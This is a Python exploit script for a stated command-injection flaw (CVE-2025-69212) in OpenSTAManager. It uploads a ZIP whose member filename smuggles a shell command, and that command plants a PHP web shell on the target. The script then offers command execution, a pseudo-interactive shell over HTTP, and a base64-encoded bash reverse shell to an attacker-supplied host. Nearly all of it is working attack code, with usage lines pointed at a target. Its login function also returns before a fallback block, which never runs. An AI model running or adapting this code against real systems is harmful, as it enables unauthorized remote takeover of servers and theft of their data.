#!/usr/bin/env python3
"""
CVE-2025-69212 - OpenSTAManager OS Command Injection via P7M filename
Affected: devcode-it/openstamanager <= 2.9.8
Author: [your handle]
Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-69212

Usage:
    python3 exploit.py -t http://target.com -u admin -p password --shell
    python3 exploit.py -t http://target.com -u admin -p password --cmd "id"
    python3 exploit.py -t http://target.com -u admin -p password --revshell 10.10.14.1 4444
"""

import zipfile
import requests
import argparse
import sys
import io
import base64
import os

# ── banner ────────────────────────────────────────────────────────────────────
def banner():
    print("""
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝
CVE-2025-69212 | OpenSTAManager P7M Command Injection
""")

# ── args ──────────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(description="CVE-2025-69212 PoC")
    p.add_argument("-t", "--target",   required=True,  help="Target URL")
    p.add_argument("-u", "--username", required=True,  help="Username")
    p.add_argument("-p", "--password", required=True,  help="Password")
    p.add_argument("--shell-name", default="SHELL.php")
    p.add_argument("--shell-path", default="files/SHELL.php")
    p.add_argument("--module-id",  default="14")
    p.add_argument("--plugin-id",  default="48")
    p.add_argument("--cmd",        default=None, help="Single command")
    p.add_argument("--shell",      action="store_true", help="Interactive shell")
    p.add_argument("--revshell",   nargs=2, metavar=("LHOST", "LPORT"),
                   help="Send reverse shell to LHOST:LPORT")
    return p.parse_args()

# ── session ───────────────────────────────────────────────────────────────────
def login(session, target, username, password):
    print(f"[*] Logging in as '{username}'...")
    r = session.post(f"{target}/index.php?op=login", data={
        "username": username,
        "password": password,
    }, allow_redirects=True)
    if "logout" in r.text.lower():
        print("[+] Login successful")
        return True
    print("[-] Login failed")
    return False
    # fallback field name
    r = session.post(f"{target}/index.php", data={
        "username": username,
        "password": password,
        "login": "1"
    }, allow_redirects=True)
    if "logout" in r.text.lower():
        print("[+] Login successful")
        return True
    print("[-] Login failed — check credentials or login endpoint")
    return False

# ── exploit ───────────────────────────────────────────────────────────────────
def make_zip(shell_name):
    shell_cmd = f"cd files && echo '<?php system($_GET[\"c\"]); ?>' > {shell_name}"
    filename  = f'invoice.p7m";{shell_cmd};echo ".p7m'
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(filename, b"DUMMY")
    buf.seek(0)
    print(f"[*] ZIP crafted — shell → files/{shell_name}")
    return buf

def upload(session, target, zip_buf, module_id, plugin_id):
    print("[*] Uploading...")
    r = session.post(
        f"{target}/actions.php",
        files={"blob1": ("exploit.zip", zip_buf, "application/zip")},
        data={"op": "save", "id_module": module_id, "id_plugin": plugin_id}
    )
    if r.status_code in [200, 500]:
        print(f"[+] Done (HTTP {r.status_code}) — 500 is expected")
        return True
    print(f"[-] Unexpected: {r.status_code}")
    return False

# ── rce helpers ───────────────────────────────────────────────────────────────
def rce(session, target, shell_path, cmd):
    """Run command, capture stdout+stderr, return output"""
    try:
        r = session.get(
            f"{target}/{shell_path}",
            params={"c": f"{cmd} 2>&1"},
            timeout=15
        )
        return r.text.strip()
    except requests.exceptions.Timeout:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"

def check_shell(session, target, shell_path):
    print(f"[*] Checking shell at /{shell_path} ...")
    out = rce(session, target, shell_path, "id")
    if "uid=" in out:
        print(f"[+] Shell confirmed: {out}")
        return True
    print("[-] Shell not responding")
    return False

# ── shell modes ───────────────────────────────────────────────────────────────
def send_reverse_shell(session, target, shell_path, lhost, lport):
    """Base64-encode the bash reverse shell to avoid char issues"""
    print(f"[*] Sending reverse shell → {lhost}:{lport}")
    print(f"[!] Start listener:  nc -lvnp {lport}")
    input("[*] Press Enter when listener is ready...")

    cmd     = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = base64.b64encode(cmd.encode()).decode()
    payload = f"echo {encoded}|base64 -d|bash"

    try:
        session.get(
            f"{target}/{shell_path}",
            params={"c": payload},
            timeout=3
        )
    except requests.exceptions.Timeout:
        pass  # expected — connection held open by shell

def interactive(session, target, shell_path):
    """
    Pseudo-interactive shell over HTTP.
    Tracks cwd manually since each request is stateless.
    For a full PTY use --revshell instead.
    """
    print("\n[+] Pseudo-shell active (type 'exit' to quit, 'revshell LHOST PORT' to upgrade)\n")
    cwd = rce(session, target, shell_path, "pwd")

    while True:
        try:
            cmd = input(f"www-data:{cwd}$ ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Exiting")
            break

        if not cmd:
            continue
        if cmd.lower() in ["exit", "quit"]:
            break

        # handle cd so prompt stays accurate
        if cmd.startswith("cd "):
            cwd = rce(session, target, shell_path, f"{cmd} && pwd")
            continue

        # inline revshell upgrade
        if cmd.startswith("revshell "):
            parts = cmd.split()
            if len(parts) == 3:
                send_reverse_shell(session, target, shell_path, parts[1], parts[2])
            else:
                print("Usage: revshell LHOST PORT")
            continue

        print(rce(session, target, shell_path, f"cd {cwd} && {cmd}"))
        # keep cwd in sync
        cwd = rce(session, target, shell_path, f"cd {cwd} && pwd")

# ── main ──────────────────────────────────────────────────────────────────────
def main():
    banner()
    args    = parse_args()
    target  = args.target.rstrip("/")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    if not login(session, target, args.username, args.password):
        sys.exit(1)

    zip_buf = make_zip(args.shell_name)
    if not upload(session, target, zip_buf, args.module_id, args.plugin_id):
        sys.exit(1)

    if not check_shell(session, target, args.shell_path):
        print("[-] Exiting — shell not confirmed")
        sys.exit(1)

    if args.revshell:
        send_reverse_shell(session, target, args.shell_path, args.revshell[0], args.revshell[1])
    elif args.cmd:
        print(rce(session, target, args.shell_path, args.cmd))
    elif args.shell:
        interactive(session, target, args.shell_path)
    else:
        print("\n[*] Use --cmd, --shell, or --revshell LHOST PORT")

if __name__ == "__main__":
    main()
